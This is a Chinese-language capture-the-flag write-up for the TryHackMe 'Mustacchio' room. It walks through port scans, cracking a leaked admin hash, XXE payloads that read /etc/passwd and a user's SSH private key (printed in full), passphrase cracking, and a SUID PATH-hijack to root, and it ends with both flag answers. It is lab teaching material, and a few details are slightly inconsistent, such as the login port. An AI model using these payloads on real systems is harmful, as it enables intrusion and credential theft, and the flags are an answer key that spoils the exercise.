# Mustacchio-wp-tryhackme-easy

nmap快速扫描：
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
```

nmap版本扫描：
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

nmap漏洞扫描：
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.87.212
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.87.212:80/contact.html
|     Form id: fname
|_    Form action: contact.html
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.0.1
| http-enum: 
|   /robots.txt: Robots file
|   /custom/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
8765/tcp open  ultraseek-http
```

gobuster扫描：
```
/images               (Status: 301) [Size: 313] [--> http://10.10.87.212/images/]
/custom               (Status: 301) [Size: 313] [--> http://10.10.87.212/custom/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.87.212/fonts/]
```

/custom/js目录下有user.bak的文件，内容为：  
admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b  
类型为SHA-1，使用hashcat解密hash：
```
hashcat -m 100 -a 0 -w /usr/share/wordlists/rockyou.txt 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19

admin:bulldog19可以在端口8764登录，里面是个评论窗口，XXE漏洞。
payload：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>Pavandeep</author>
  <com>Hacking Articles</com>
</comment>
```
输出：
```
Name: root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false 
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false 
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false 
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false 
lxd:x:106:65534::/var/lib/lxd/:/bin/false 
messagebus:x:107:111::/var/run/dbus:/bin/false 
uuidd:x:108:112::/run/uuidd:/bin/false 
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false 
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin 
pollinate:x:111:1::/var/cache/pollinate:/bin/false 
joe:x:1002:1002::/home/joe:/bin/bash 
barry:x:1003:1003::/home/barry:/bin/bash
```

payload：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&name;</name>
  <author>Pavandeep</author>
  <com>Hacking Articles</com>
</comment>
```


私钥输出：
``````
-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY-----
``````
复制密钥到文件，使用ssh2john输出到文件，然后用john解开私钥的密码，时间可能有点长，大概有一把植物大战僵尸那么长，如果复制密钥到文件用ssh2john总是出问题或是解不开的，可以尝试复制源码里的密钥。

john解出来的密码：urieljames(id_rsa) 

使用chmod 600 id_rsa给文件权限，然后用ssh和刚解出的密码登录：
```
ssh -i id_rsa barry@IP
```
找到第一个user.txt。

根据提示查找SUID文件：
```
find / -perm -u=s -type f 2>/dev/null
```

其中有一个"/home/joe/live_log"的文件，感觉有问题，但技艺不精，以下参考wp。

通过strings /live_log的方法找到一句"tail -f /var/log/nginx/access.log"，wp上说这个文件可以无视路径执行这句命令，所以再找一个我们有权限的文件夹创造一个tail的副本并给它权限并执行就可以拿到root，具体流程：
```
echo "/bin/bash" > tail
chmod 777 tail
export PATH=/tmp:$PATH
/home/joe/live_log
cat /root/root.txt
```


## What is the user flag?
答案：62d77a4d5f97d47c5aa38b3b2651b831

## What is the root flag?
答案：3223581420d906c4dd1a5f9b530393a5
